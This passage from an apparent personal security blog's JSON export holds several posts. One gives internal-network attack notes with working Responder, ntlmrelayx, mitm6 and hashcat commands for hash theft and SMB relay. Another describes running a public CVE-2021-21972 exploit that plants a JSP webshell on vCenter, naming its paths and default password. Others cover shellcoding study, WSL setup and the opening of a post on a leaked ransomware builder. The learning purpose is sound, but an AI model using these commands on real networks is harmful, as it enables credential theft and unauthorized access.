</p>\n</li>\n<li><p>Netbios and LLMNR </p>\n</li>\n<li><p>Relay Attack </p>\n</li>\n<li><p>NTLM Relay</p>\n</li>\n<li><p>MS17-010, eternalblue still found surprisingly a lot on internal test</p>\n</li>\n<li><p>Kerberoasting, post comprimise</p>\n</li>\n<li><p>mitm6</p>\n</li>\n</ul>\n<p>Top Five ways i got domain admin on your intenrnal network before lunch </p>\n<p>—-LLMNR Poisining<br>Link local multicast name resolution<br>Previously NBT-NT or netbios name service<br>basically DNS, that’s what we use when DNS fails </p>\n<p>This is a man in the middle attack, stealing the hash<br>Using Responder.py from Impacket<br>python Responder.py -I tun0 -rdwv<br>we get an NTLM hash<br>crack with hashcat hashcat -m hashes.txt rockyou.txt  or hashcat -m hashfile wordlist</p>\n<p>run it first thing in the morning or back from lunch because you need a lot of traffic to intercept<br>When we respond to the service it responds back with a username and a NTLM hash</p>\n<p>—-SMB Relay </p>\n<p>instead of cracking hashes that we get with responder we can instead relay those<br>hashes to specific machines and potentially gain access.</p>\n<p>cannot relay credential to the same machine<br>smb signing disabled<br>replayed user credentials must be on that machine</p>\n<p>open Responder.conf file and turn off SMB and HTTP<br>run responder python Responder.py -I tun0 -rdwv<br>setup your relay ntlmrelayx.py -tf targets.txt -smb2support then wait for an event<br>profit<br>nc ip 11000 afterwards for an smb shell<br>Dumping out the SAM files, they’re like shadow in linux. Usernames and hashes for local users on the computer.</p>\n<p>SMB signing disabled by default on workstation accounts but by default enabled and required on domain controllers<br>Discovering hosts with SMB signing disabled. You can run nessus and it will tell you.<br>NMAP built in script and github SMB signing check script<br>NMAP - nmap –script&#x3D;smb2-security-mode.nse -p445 IP&#x2F;24<br>can attack even if it says message signing enable but not required</p>\n<p>—-IPv6 Attacks<br>another form of relaying, a lot more reliable. Utilizing ipv6<br>spoof dns for ipv6 addresses because usually no one is doing dns for ipv4<br>you don’t have to be admin</p>\n<p>Learned about these a little bit previously from a presentation by QCS (Queen City Skiddies) member lpha3ch0.<br><a href=\"https://qcskiddies.com/?page_id=79\">https://qcskiddies.com/?page_id=79</a></p>\n<p>mitm6 -d domain<br>setup a relay attack ntlmrelayx.py -6 -t ldaps:\\domaincontrollerip -wh wpadfile -l dir<br>can use SMB, LDAP, IMAP and MSSQL<br>-6 is for ipv6 and -t is for target<br>loot is in html files open with firefox</p>\n<hr>\n<p>Thanks for reading!</p>\n"},{"layout":"single","title":"Microsoft Ignite Security Operations Analyst Challenge","date":"2021-12-08T05:00:00.000Z","classes":"wide","header":{"teaser":null},"_content":" \n\nThe Security Operations Analyst Challenge was a great opportunity to learn about Microsoft's solutions to endpoint and cloud security.\nIncluding but not limited to\n\n \n![](/assets/images/ignite.png)\n\nMicrosoft 365 for Endpoint\n\nThreat protection with Microsoft 365\n\nMicrosoft 365 Defender \n\nAzure AD Identity Protection\n\nMicrosoft Cloud App Security \n\nMicrosoft Sentinel \n\nKQL basics\n\n \n\nIt was a great opportunity and now I'm able to take the exam for free. Can't wait!  \n","source":"_posts/2021-12-8-Microsoft Ignite Security Operations Analyst Challenge.md","raw":"---\nlayout: single\ntitle: Microsoft Ignite Security Operations Analyst Challenge \ndate: 2021-12-8\nclasses: wide\nheader:\n  teaser:\ntags:\n  - Certification\n  - Blue Team\n--- \n\nThe Security Operations Analyst Challenge was a great opportunity to learn about Microsoft's solutions to endpoint and cloud security.\nIncluding but not limited to\n\n \n![](/assets/images/ignite.png)\n\nMicrosoft 365 for Endpoint\n\nThreat protection with Microsoft 365\n\nMicrosoft 365 Defender \n\nAzure AD Identity Protection\n\nMicrosoft Cloud App Security \n\nMicrosoft Sentinel \n\nKQL basics\n\n \n\nIt was a great opportunity and now I'm able to take the exam for free. Can't wait!  \n","slug":"2021-12-8-Microsoft Ignite Security Operations Analyst Challenge","published":1,"updated":"2024-07-24T16:20:44.834Z","comments":1,"photos":[],"_id":"clz07c5kb0007m3cpaloo1994","content":"<p>The Security Operations Analyst Challenge was a great opportunity to learn about Microsoft’s solutions to endpoint and cloud security.<br>Including but not limited to</p>\n<p><img src=\"/assets/images/ignite.png\"></p>\n<p>Microsoft 365 for Endpoint</p>\n<p>Threat protection with Microsoft 365</p>\n<p>Microsoft 365 Defender </p>\n<p>Azure AD Identity Protection</p>\n<p>Microsoft Cloud App Security </p>\n<p>Microsoft Sentinel </p>\n<p>KQL basics</p>\n<p>It was a great opportunity and now I’m able to take the exam for free. Can’t wait!  </p>\n","excerpt":"","more":"<p>The Security Operations Analyst Challenge was a great opportunity to learn about Microsoft’s solutions to endpoint and cloud security.<br>Including but not limited to</p>\n<p><img src=\"/assets/images/ignite.png\"></p>\n<p>Microsoft 365 for Endpoint</p>\n<p>Threat protection with Microsoft 365</p>\n<p>Microsoft 365 Defender </p>\n<p>Azure AD Identity Protection</p>\n<p>Microsoft Cloud App Security </p>\n<p>Microsoft Sentinel </p>\n<p>KQL basics</p>\n<p>It was a great opportunity and now I’m able to take the exam for free. Can’t wait!  </p>\n"},{"layout":"single","title":"SLAE x86 Assembly and Shellcoding on Linux Notes","date":"2021-12-08T05:00:00.000Z","classes":"wide","header":{"teaser":null},"_content":" \n \nNotes taken while going through the Pentester Academy x86 Assembly and Shellcoding on Linux Course.\nNot done with it yet. Publishing the assignments as I complete them on my Github.\n\n\n\n\nSetup up Debian lab environment, what is assembly\nSeeing CPU info on what we can do (architecture and stuff), and memory/cpu architecture basics\nExploring registers with GDB, should get more familiar with GDB\n\"set dissasembly flavor intel\" within gdb\n\nModern normal computer use protected mode most of the time and that's what I should concern myself with.\nuse assembler (NASM) and linker (LD) to link the assembly executable in ELF format\nWrote hello world in intel 32bit assembly, getting used to syntax and nuances to write shellcode later on.\nsyscalls or system calls to leverage operating system to avoid writing low level code that's been already been written\nint0x80 to invoke syscalls\n\nStepped through our hello world program with gdb to understand how registers were used throughout\nlearned about data types such as bits, bytes, words, dwords, etc. (more of a refresher but it was useful none the less)\n\nwhen moving data with the MOV instruction you will be moving it between registers\nmemory to register (and vice versa)\nimmediate data to register\nor immediate register to memory\nLEA stands for load effective address or loading pointer values for example LEA eax, [label]. label being the label of the name in the data section\nXCHG swaps values register to register, or also register to memory \n","source":"_posts/2021-12-8-SLAE x86 Assembly and Shellcoding on Linux Notes.md","raw":"---\nlayout: single\ntitle:  SLAE x86 Assembly and Shellcoding on Linux Notes \ndate: 2021-12-8\nclasses: wide\nheader:\n  teaser:\ntags:\n  - Certification\n  - pwn\n--- \n \nNotes taken while going through the Pentester Academy x86 Assembly and Shellcoding on Linux Course.\nNot done with it yet. Publishing the assignments as I complete them on my Github.\n\n\n\n\nSetup up Debian lab environment, what is assembly\nSeeing CPU info on what we can do (architecture and stuff), and memory/cpu architecture basics\nExploring registers with GDB, should get more familiar with GDB\n\"set dissasembly flavor intel\" within gdb\n\nModern normal computer use protected mode most of the time and that's what I should concern myself with.\nuse assembler (NASM) and linker (LD) to link the assembly executable in ELF format\nWrote hello world in intel 32bit assembly, getting used to syntax and nuances to write shellcode later on.\nsyscalls or system calls to leverage operating system to avoid writing low level code that's been already been written\nint0x80 to invoke syscalls\n\nStepped through our hello world program with gdb to understand how registers were used throughout\nlearned about data types such as bits, bytes, words, dwords, etc. (more of a refresher but it was useful none the less)\n\nwhen moving data with the MOV instruction you will be moving it between registers\nmemory to register (and vice versa)\nimmediate data to register\nor immediate register to memory\nLEA stands for load effective address or loading pointer values for example LEA eax, [label]. label being the label of the name in the data section\nXCHG swaps values register to register, or also register to memory \n","slug":"2021-12-8-SLAE x86 Assembly and Shellcoding on Linux Notes","published":1,"updated":"2024-07-24T16:20:44.834Z","comments":1,"photos":[],"_id":"clz07c5ke0008m3cpcv5pebvt","content":"<p>Notes taken while going through the Pentester Academy x86 Assembly and Shellcoding on Linux Course.<br>Not done with it yet. Publishing the assignments as I complete them on my Github.</p>\n<p>Setup up Debian lab environment, what is assembly<br>Seeing CPU info on what we can do (architecture and stuff), and memory&#x2F;cpu architecture basics<br>Exploring registers with GDB, should get more familiar with GDB<br>“set dissasembly flavor intel” within gdb</p>\n<p>Modern normal computer use protected mode most of the time and that’s what I should concern myself with.<br>use assembler (NASM) and linker (LD) to link the assembly executable in ELF format<br>Wrote hello world in intel 32bit assembly, getting used to syntax and nuances to write shellcode later on.<br>syscalls or system calls to leverage operating system to avoid writing low level code that’s been already been written<br>int0x80 to invoke syscalls</p>\n<p>Stepped through our hello world program with gdb to understand how registers were used throughout<br>learned about data types such as bits, bytes, words, dwords, etc. (more of a refresher but it was useful none the less)</p>\n<p>when moving data with the MOV instruction you will be moving it between registers<br>memory to register (and vice versa)<br>immediate data to register<br>or immediate register to memory<br>LEA stands for load effective address or loading pointer values for example LEA eax, [label]. label being the label of the name in the data section<br>XCHG swaps values register to register, or also register to memory </p>\n","excerpt":"","more":"<p>Notes taken while going through the Pentester Academy x86 Assembly and Shellcoding on Linux Course.<br>Not done with it yet. Publishing the assignments as I complete them on my Github.</p>\n<p>Setup up Debian lab environment, what is assembly<br>Seeing CPU info on what we can do (architecture and stuff), and memory&#x2F;cpu architecture basics<br>Exploring registers with GDB, should get more familiar with GDB<br>“set dissasembly flavor intel” within gdb</p>\n<p>Modern normal computer use protected mode most of the time and that’s what I should concern myself with.<br>use assembler (NASM) and linker (LD) to link the assembly executable in ELF format<br>Wrote hello world in intel 32bit assembly, getting used to syntax and nuances to write shellcode later on.<br>syscalls or system calls to leverage operating system to avoid writing low level code that’s been already been written<br>int0x80 to invoke syscalls</p>\n<p>Stepped through our hello world program with gdb to understand how registers were used throughout<br>learned about data types such as bits, bytes, words, dwords, etc. (more of a refresher but it was useful none the less)</p>\n<p>when moving data with the MOV instruction you will be moving it between registers<br>memory to register (and vice versa)<br>immediate data to register<br>or immediate register to memory<br>LEA stands for load effective address or loading pointer values for example LEA eax, [label]. label being the label of the name in the data section<br>XCHG swaps values register to register, or also register to memory </p>\n"},{"layout":"single","title":"Playing with a Chinese PoC for a VMware CVE! (For fun and ZERO profit)","date":"2021-12-09T05:00:00.000Z","classes":"wide","header":{"teaser":null},"_content":" \n\n## Introduction \nThe CVE in question is CVE-2021-21972.\n\nI archived it in the event the repository goes down.\n\nhttps://web.archive.org/web/20211030123608/https://github.com/NS-Sp4ce/CVE-2021-21972\n\n![](/assets/images/chinese-poc/cve.png)\n\nObviously don't run this script on your own machine without proper precautions.\n\nI'm going to be using a Kali Linux virtual machine in VMware to sandbox harm from my actual computer.\nSpeaking of sandbox, I made a snapshot of my virtual machine and ran the script. \n\n![](/assets/images/chinese-poc/cve2.png)\n\nOn the first run it didn't execute properly so I investigated line 258 and removed the problem code. (I couldn't be bothered to fix the actual problem)\n\nI tried understanding the script afterwards to understand what's going on under the hood. Here's an extremely surface level breakdown. \n\n-Initializing variables for use later, for example 🠓🠓🠓\n\n# init vulnerable url and shell URL\nVUL_URI = \"/ui/vropspluginui/rest/services/uploadova\"\nWINDOWS_SHELL_URL = \"/statsreport/shell.jsp\"\nLINUX_SHELL_URL = \"/ui/resources/shell.jsp\"\n\n-Verify whether the url is vCenter or VCSA and what version. Check if it's vulnerable\n\n-Upload corresponding .jsp payload (windows or linux) to vulnerable url, check for success\n\n--------------------------------------------------------------------------\n\n## Chinese C2 Fun Times!!!!\n\nIf the upload is successful you will be faced with text that says\n\n \"[+] Shell exist URL: {url}, default password:rebeyond\"\n\nWith no further instructions on how to manage it. Going into the closed issues on the Github page I came across \n\n![](/assets/images/chinese-poc/cve3.png)\n\n I downloaded \"Behinder\" from the releases section of the Github, unzipped it, and attempted to run the jar file held within.\n \n \n![](/assets/images/chinese-poc/cve4.png)\n\nUnsure of what this error message says (I can't read Chinese) I got to googling and by assumption I determined that the issue had to do with \"Javafx\" whatever that is. \n\nI downloaded the SDK and moved the \"lib\" folder to where the jar file was located. Ran the command again and was pleasantly surprised. \n\n![](/assets/images/chinese-poc/cve5.png)\n\nTook some fiddling but I eventually bumped into how to add my shell. From there I had access to a shell to escalate privileges or drop a payload as a user.\n\n hypothetically\n\nIf you want a breakdown of the CVE itself from the author check out: \n\nhttps://swarm.ptsecurity.com/unauth-rce-vmware/\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/2021-12-8-Playing with a Chinese PoC for a VMware CVE! (For fun and ZERO profit.md","raw":"---\nlayout: single\ntitle:  Playing with a Chinese PoC for a VMware CVE! (For fun and ZERO profit) \ndate: 2021-12-9\nclasses: wide\nheader:\n  teaser: \ntags:\n  - CVE\n--- \n\n## Introduction \nThe CVE in question is CVE-2021-21972.\n\nI archived it in the event the repository goes down.\n\nhttps://web.archive.org/web/20211030123608/https://github.com/NS-Sp4ce/CVE-2021-21972\n\n![](/assets/images/chinese-poc/cve.png)\n\nObviously don't run this script on your own machine without proper precautions.\n\nI'm going to be using a Kali Linux virtual machine in VMware to sandbox harm from my actual computer.\nSpeaking of sandbox, I made a snapshot of my virtual machine and ran the script. \n\n![](/assets/images/chinese-poc/cve2.png)\n\nOn the first run it didn't execute properly so I investigated line 258 and removed the problem code. (I couldn't be bothered to fix the actual problem)\n\nI tried understanding the script afterwards to understand what's going on under the hood. Here's an extremely surface level breakdown. \n\n-Initializing variables for use later, for example 🠓🠓🠓\n\n# init vulnerable url and shell URL\nVUL_URI = \"/ui/vropspluginui/rest/services/uploadova\"\nWINDOWS_SHELL_URL = \"/statsreport/shell.jsp\"\nLINUX_SHELL_URL = \"/ui/resources/shell.jsp\"\n\n-Verify whether the url is vCenter or VCSA and what version. Check if it's vulnerable\n\n-Upload corresponding .jsp payload (windows or linux) to vulnerable url, check for success\n\n--------------------------------------------------------------------------\n\n## Chinese C2 Fun Times!!!!\n\nIf the upload is successful you will be faced with text that says\n\n \"[+] Shell exist URL: {url}, default password:rebeyond\"\n\nWith no further instructions on how to manage it. Going into the closed issues on the Github page I came across \n\n![](/assets/images/chinese-poc/cve3.png)\n\n I downloaded \"Behinder\" from the releases section of the Github, unzipped it, and attempted to run the jar file held within.\n \n \n![](/assets/images/chinese-poc/cve4.png)\n\nUnsure of what this error message says (I can't read Chinese) I got to googling and by assumption I determined that the issue had to do with \"Javafx\" whatever that is. \n\nI downloaded the SDK and moved the \"lib\" folder to where the jar file was located. Ran the command again and was pleasantly surprised. \n\n![](/assets/images/chinese-poc/cve5.png)\n\nTook some fiddling but I eventually bumped into how to add my shell. From there I had access to a shell to escalate privileges or drop a payload as a user.\n\n hypothetically\n\nIf you want a breakdown of the CVE itself from the author check out: \n\nhttps://swarm.ptsecurity.com/unauth-rce-vmware/\n\n\n\n\n\n\n\n\n\n\n","slug":"2021-12-8-Playing with a Chinese PoC for a VMware CVE! (For fun and ZERO profit","published":1,"updated":"2024-07-24T16:20:44.834Z","comments":1,"photos":[],"_id":"clz07c5ko000am3cp2olw2s0l","content":"<h2 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h2><p>The CVE in question is CVE-2021-21972.</p>\n<p>I archived it in the event the repository goes down.</p>\n<p><a href=\"https://web.archive.org/web/20211030123608/https://github.com/NS-Sp4ce/CVE-2021-21972\">https://web.archive.org/web/20211030123608/https://github.com/NS-Sp4ce/CVE-2021-21972</a></p>\n<p><img src=\"/assets/images/chinese-poc/cve.png\"></p>\n<p>Obviously don’t run this script on your own machine without proper precautions.</p>\n<p>I’m going to be using a Kali Linux virtual machine in VMware to sandbox harm from my actual computer.<br>Speaking of sandbox, I made a snapshot of my virtual machine and ran the script. </p>\n<p><img src=\"/assets/images/chinese-poc/cve2.png\"></p>\n<p>On the first run it didn’t execute properly so I investigated line 258 and removed the problem code. (I couldn’t be bothered to fix the actual problem)</p>\n<p>I tried understanding the script afterwards to understand what’s going on under the hood. Here’s an extremely surface level breakdown. </p>\n<p>-Initializing variables for use later, for example 🠓🠓🠓</p>\n<h1 id=\"init-vulnerable-url-and-shell-URL\"><a href=\"#init-vulnerable-url-and-shell-URL\" class=\"headerlink\" title=\"init vulnerable url and shell URL\"></a>init vulnerable url and shell URL</h1><p>VUL_URI &#x3D; “&#x2F;ui&#x2F;vropspluginui&#x2F;rest&#x2F;services&#x2F;uploadova”<br>WINDOWS_SHELL_URL &#x3D; “&#x2F;statsreport&#x2F;shell.jsp”<br>LINUX_SHELL_URL &#x3D; “&#x2F;ui&#x2F;resources&#x2F;shell.jsp”</p>\n<p>-Verify whether the url is vCenter or VCSA and what version. Check if it’s vulnerable</p>\n<p>-Upload corresponding .jsp payload (windows or linux) to vulnerable url, check for success</p>\n<hr>\n<h2 id=\"Chinese-C2-Fun-Times\"><a href=\"#Chinese-C2-Fun-Times\" class=\"headerlink\" title=\"Chinese C2 Fun Times!!!!\"></a>Chinese C2 Fun Times!!!!</h2><p>If the upload is successful you will be faced with text that says</p>\n<p> “[+] Shell exist URL: {url}, default password:rebeyond”</p>\n<p>With no further instructions on how to manage it. Going into the closed issues on the Github page I came across </p>\n<p><img src=\"/assets/images/chinese-poc/cve3.png\"></p>\n<p> I downloaded “Behinder” from the releases section of the Github, unzipped it, and attempted to run the jar file held within.</p>\n<p><img src=\"/assets/images/chinese-poc/cve4.png\"></p>\n<p>Unsure of what this error message says (I can’t read Chinese) I got to googling and by assumption I determined that the issue had to do with “Javafx” whatever that is. </p>\n<p>I downloaded the SDK and moved the “lib” folder to where the jar file was located. Ran the command again and was pleasantly surprised. </p>\n<p><img src=\"/assets/images/chinese-poc/cve5.png\"></p>\n<p>Took some fiddling but I eventually bumped into how to add my shell. From there I had access to a shell to escalate privileges or drop a payload as a user.</p>\n<p> hypothetically</p>\n<p>If you want a breakdown of the CVE itself from the author check out: </p>\n<p><a href=\"https://swarm.ptsecurity.com/unauth-rce-vmware/\">https://swarm.ptsecurity.com/unauth-rce-vmware/</a></p>\n","excerpt":"","more":"<h2 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h2><p>The CVE in question is CVE-2021-21972.</p>\n<p>I archived it in the event the repository goes down.</p>\n<p><a href=\"https://web.archive.org/web/20211030123608/https://github.com/NS-Sp4ce/CVE-2021-21972\">https://web.archive.org/web/20211030123608/https://github.com/NS-Sp4ce/CVE-2021-21972</a></p>\n<p><img src=\"/assets/images/chinese-poc/cve.png\"></p>\n<p>Obviously don’t run this script on your own machine without proper precautions.</p>\n<p>I’m going to be using a Kali Linux virtual machine in VMware to sandbox harm from my actual computer.<br>Speaking of sandbox, I made a snapshot of my virtual machine and ran the script. </p>\n<p><img src=\"/assets/images/chinese-poc/cve2.png\"></p>\n<p>On the first run it didn’t execute properly so I investigated line 258 and removed the problem code. (I couldn’t be bothered to fix the actual problem)</p>\n<p>I tried understanding the script afterwards to understand what’s going on under the hood. Here’s an extremely surface level breakdown. </p>\n<p>-Initializing variables for use later, for example 🠓🠓🠓</p>\n<h1 id=\"init-vulnerable-url-and-shell-URL\"><a href=\"#init-vulnerable-url-and-shell-URL\" class=\"headerlink\" title=\"init vulnerable url and shell URL\"></a>init vulnerable url and shell URL</h1><p>VUL_URI &#x3D; “&#x2F;ui&#x2F;vropspluginui&#x2F;rest&#x2F;services&#x2F;uploadova”<br>WINDOWS_SHELL_URL &#x3D; “&#x2F;statsreport&#x2F;shell.jsp”<br>LINUX_SHELL_URL &#x3D; “&#x2F;ui&#x2F;resources&#x2F;shell.jsp”</p>\n<p>-Verify whether the url is vCenter or VCSA and what version. Check if it’s vulnerable</p>\n<p>-Upload corresponding .jsp payload (windows or linux) to vulnerable url, check for success</p>\n<hr>\n<h2 id=\"Chinese-C2-Fun-Times\"><a href=\"#Chinese-C2-Fun-Times\" class=\"headerlink\" title=\"Chinese C2 Fun Times!!!!\"></a>Chinese C2 Fun Times!!!!</h2><p>If the upload is successful you will be faced with text that says</p>\n<p> “[+] Shell exist URL: {url}, default password:rebeyond”</p>\n<p>With no further instructions on how to manage it. Going into the closed issues on the Github page I came across </p>\n<p><img src=\"/assets/images/chinese-poc/cve3.png\"></p>\n<p> I downloaded “Behinder” from the releases section of the Github, unzipped it, and attempted to run the jar file held within.</p>\n<p><img src=\"/assets/images/chinese-poc/cve4.png\"></p>\n<p>Unsure of what this error message says (I can’t read Chinese) I got to googling and by assumption I determined that the issue had to do with “Javafx” whatever that is. </p>\n<p>I downloaded the SDK and moved the “lib” folder to where the jar file was located. Ran the command again and was pleasantly surprised. </p>\n<p><img src=\"/assets/images/chinese-poc/cve5.png\"></p>\n<p>Took some fiddling but I eventually bumped into how to add my shell. From there I had access to a shell to escalate privileges or drop a payload as a user.</p>\n<p> hypothetically</p>\n<p>If you want a breakdown of the CVE itself from the author check out: </p>\n<p><a href=\"https://swarm.ptsecurity.com/unauth-rce-vmware/\">https://swarm.ptsecurity.com/unauth-rce-vmware/</a></p>\n"},{"layout":"single","title":"Windows Subsystem for Linux (WSL) Workflow","date":"2021-12-08T05:00:00.000Z","classes":"wide","header":{"teaser":null},"_content":" \n\n In this post I'm going to go over customizations I've made to WSL to make my life easier.\n\nThe Windows Subsystem for Linux  is as the name implies, a Linux subsystem within Windows. This allows for bash scripting, (personally) easier command line management of files, among other things. \n\n\nTo install wsl you should navigate to the Windows Store and choose your distribution. \n\nWhile your in the store install Windows Terminal as well have a better client for both powershell and your new wsl. Follow the instructions to complete the base installation.  \n\n\nGo ahead and upgrade to wsl2 with this guide.\nhttps://www.omgubuntu.co.uk/how-to-install-wsl2-on-windows-10\n\n![](/assets/images/wsl/wsl.png)\n\nFirst things first make sure to update all your packages. I personally use Debian so I'm going to use apt as the example here. Opensuse and Alpine Linux both use separate package managers. This should apply to Ubuntu as well.\n\n\"apt update\"\n\"apt upgrade\"\n\nIf you are not the root user (which you are not by default) you will have to prepend the apt commands with \"sudo\" to \"do\" this action as a super user (root).\n\n----------------------------------------------------------------------------------------\nHere are some packages I use daily along with a small description of each. To make your life easier.\nYou can install these on Debian based installations (Ubuntu included) using sudo apt install <package-name>\n\n \n\ntmux - tmux is a terminal multiplexer that allows for you to split the screen into separate instances so to speak. Check out the souce code here \n\nhttps://github.com/tmux/tmux\n\n otherwise install (on debian based OS) with apt install\n  \n![](/assets/images/wsl/wsl2.png)\n  \n   ^^^^^^^^^^^^^^^^^^^^^\n\nSpaceship - For my terminal prompt. It's a little complex to install for laymen but I like the way it looks. Check it out: https://github.com/spaceship-prompt/spaceship-prompt\n\nNeovim - As my go to text editor, if you like vim you'll love neovim. An \"upgraded\" version of vim with extended support for plugins. If you like tinkering with configs this is for you.\nRead more about it here: https://neovim.io/\n\n\nFor most other situations if I need reccomendations on Linux software, whether for a virtual machine or wsl in this instance. I consult\nhttps://github.com/luong-komorebi/Awesome-Linux-Software\n\nwhich has an enormous list of software for most occasions.\n\nThanks for reading!!!!\n","source":"_posts/2021-12-8-Windows Subsystem for Linux (WSL) Workflow.md","raw":"---\nlayout: single\ntitle: Windows Subsystem for Linux (WSL) Workflow \ndate: 2021-12-8\nclasses: wide\nheader:\n  teaser: \ntags:\n  - Linux\n  - Workflow\n--- \n\n In this post I'm going to go over customizations I've made to WSL to make my life easier.\n\nThe Windows Subsystem for Linux  is as the name implies, a Linux subsystem within Windows. This allows for bash scripting, (personally) easier command line management of files, among other things. \n\n\nTo install wsl you should navigate to the Windows Store and choose your distribution. \n\nWhile your in the store install Windows Terminal as well have a better client for both powershell and your new wsl. Follow the instructions to complete the base installation.  \n\n\nGo ahead and upgrade to wsl2 with this guide.\nhttps://www.omgubuntu.co.uk/how-to-install-wsl2-on-windows-10\n\n![](/assets/images/wsl/wsl.png)\n\nFirst things first make sure to update all your packages. I personally use Debian so I'm going to use apt as the example here. Opensuse and Alpine Linux both use separate package managers. This should apply to Ubuntu as well.\n\n\"apt update\"\n\"apt upgrade\"\n\nIf you are not the root user (which you are not by default) you will have to prepend the apt commands with \"sudo\" to \"do\" this action as a super user (root).\n\n----------------------------------------------------------------------------------------\nHere are some packages I use daily along with a small description of each. To make your life easier.\nYou can install these on Debian based installations (Ubuntu included) using sudo apt install <package-name>\n\n \n\ntmux - tmux is a terminal multiplexer that allows for you to split the screen into separate instances so to speak. Check out the souce code here \n\nhttps://github.com/tmux/tmux\n\n otherwise install (on debian based OS) with apt install\n  \n![](/assets/images/wsl/wsl2.png)\n  \n   ^^^^^^^^^^^^^^^^^^^^^\n\nSpaceship - For my terminal prompt. It's a little complex to install for laymen but I like the way it looks. Check it out: https://github.com/spaceship-prompt/spaceship-prompt\n\nNeovim - As my go to text editor, if you like vim you'll love neovim. An \"upgraded\" version of vim with extended support for plugins. If you like tinkering with configs this is for you.\nRead more about it here: https://neovim.io/\n\n\nFor most other situations if I need reccomendations on Linux software, whether for a virtual machine or wsl in this instance. I consult\nhttps://github.com/luong-komorebi/Awesome-Linux-Software\n\nwhich has an enormous list of software for most occasions.\n\nThanks for reading!!!!\n","slug":"2021-12-8-Windows Subsystem for Linux (WSL) Workflow","published":1,"updated":"2024-07-24T16:20:44.838Z","comments":1,"photos":[],"_id":"clz07c5kt000cm3cp7uxf00bk","content":"<p> In this post I’m going to go over customizations I’ve made to WSL to make my life easier.</p>\n<p>The Windows Subsystem for Linux  is as the name implies, a Linux subsystem within Windows. This allows for bash scripting, (personally) easier command line management of files, among other things. </p>\n<p>To install wsl you should navigate to the Windows Store and choose your distribution. </p>\n<p>While your in the store install Windows Terminal as well have a better client for both powershell and your new wsl. Follow the instructions to complete the base installation.  </p>\n<p>Go ahead and upgrade to wsl2 with this guide.<br><a href=\"https://www.omgubuntu.co.uk/how-to-install-wsl2-on-windows-10\">https://www.omgubuntu.co.uk/how-to-install-wsl2-on-windows-10</a></p>\n<p><img src=\"/assets/images/wsl/wsl.png\"></p>\n<p>First things first make sure to update all your packages. I personally use Debian so I’m going to use apt as the example here. Opensuse and Alpine Linux both use separate package managers. This should apply to Ubuntu as well.</p>\n<p>“apt update”<br>“apt upgrade”</p>\n<p>If you are not the root user (which you are not by default) you will have to prepend the apt commands with “sudo” to “do” this action as a super user (root).</p>\n<hr>\n<p>Here are some packages I use daily along with a small description of each. To make your life easier.<br>You can install these on Debian based installations (Ubuntu included) using sudo apt install <package-name></p>\n<p>tmux - tmux is a terminal multiplexer that allows for you to split the screen into separate instances so to speak. Check out the souce code here </p>\n<p><a href=\"https://github.com/tmux/tmux\">https://github.com/tmux/tmux</a></p>\n<p> otherwise install (on debian based OS) with apt install</p>\n<p><img src=\"/assets/images/wsl/wsl2.png\"></p>\n<p>   ^^^^^^^^^^^^^^^^^^^^^</p>\n<p>Spaceship - For my terminal prompt. It’s a little complex to install for laymen but I like the way it looks. Check it out: <a href=\"https://github.com/spaceship-prompt/spaceship-prompt\">https://github.com/spaceship-prompt/spaceship-prompt</a></p>\n<p>Neovim - As my go to text editor, if you like vim you’ll love neovim. An “upgraded” version of vim with extended support for plugins. If you like tinkering with configs this is for you.<br>Read more about it here: <a href=\"https://neovim.io/\">https://neovim.io/</a></p>\n<p>For most other situations if I need reccomendations on Linux software, whether for a virtual machine or wsl in this instance. I consult<br><a href=\"https://github.com/luong-komorebi/Awesome-Linux-Software\">https://github.com/luong-komorebi/Awesome-Linux-Software</a></p>\n<p>which has an enormous list of software for most occasions.</p>\n<p>Thanks for reading!!!!</p>\n","excerpt":"","more":"<p> In this post I’m going to go over customizations I’ve made to WSL to make my life easier.</p>\n<p>The Windows Subsystem for Linux  is as the name implies, a Linux subsystem within Windows. This allows for bash scripting, (personally) easier command line management of files, among other things. </p>\n<p>To install wsl you should navigate to the Windows Store and choose your distribution. </p>\n<p>While your in the store install Windows Terminal as well have a better client for both powershell and your new wsl. Follow the instructions to complete the base installation.  </p>\n<p>Go ahead and upgrade to wsl2 with this guide.<br><a href=\"https://www.omgubuntu.co.uk/how-to-install-wsl2-on-windows-10\">https://www.omgubuntu.co.uk/how-to-install-wsl2-on-windows-10</a></p>\n<p><img src=\"/assets/images/wsl/wsl.png\"></p>\n<p>First things first make sure to update all your packages. I personally use Debian so I’m going to use apt as the example here. Opensuse and Alpine Linux both use separate package managers. This should apply to Ubuntu as well.</p>\n<p>“apt update”<br>“apt upgrade”</p>\n<p>If you are not the root user (which you are not by default) you will have to prepend the apt commands with “sudo” to “do” this action as a super user (root).</p>\n<hr>\n<p>Here are some packages I use daily along with a small description of each. To make your life easier.<br>You can install these on Debian based installations (Ubuntu included) using sudo apt install <package-name></p>\n<p>tmux - tmux is a terminal multiplexer that allows for you to split the screen into separate instances so to speak. Check out the souce code here </p>\n<p><a href=\"https://github.com/tmux/tmux\">https://github.com/tmux/tmux</a></p>\n<p> otherwise install (on debian based OS) with apt install</p>\n<p><img src=\"/assets/images/wsl/wsl2.png\"></p>\n<p>   ^^^^^^^^^^^^^^^^^^^^^</p>\n<p>Spaceship - For my terminal prompt. It’s a little complex to install for laymen but I like the way it looks. Check it out: <a href=\"https://github.com/spaceship-prompt/spaceship-prompt\">https://github.com/spaceship-prompt/spaceship-prompt</a></p>\n<p>Neovim - As my go to text editor, if you like vim you’ll love neovim. An “upgraded” version of vim with extended support for plugins. If you like tinkering with configs this is for you.<br>Read more about it here: <a href=\"https://neovim.io/\">https://neovim.io/</a></p>\n<p>For most other situations if I need reccomendations on Linux software, whether for a virtual machine or wsl in this instance. I consult<br><a href=\"https://github.com/luong-komorebi/Awesome-Linux-Software\">https://github.com/luong-komorebi/Awesome-Linux-Software</a></p>\n<p>which has an enormous list of software for most occasions.</p>\n<p>Thanks for reading!!!!</p>\n"},{"layout":"single","title":"Leaked Babuk Ransomware Builder Fun!!","date":"2021-12-09T05:00:00.000Z","classes":"wide","header":{"teaser":"/assets/images/ransom-note.jpg"},"_content":" \n\nRealized I had a file named \"babuk_builder.zip\" sitting on my computer that I haven't messed with. \nToday's the day! This isn't the cutting edge of ransomware leaks but it is interesting none the less.\n![](/assets/images/babukPost/ransom-built.png)\n\n## Objectives\nIn this post I will go over:\n\n    The process of generating 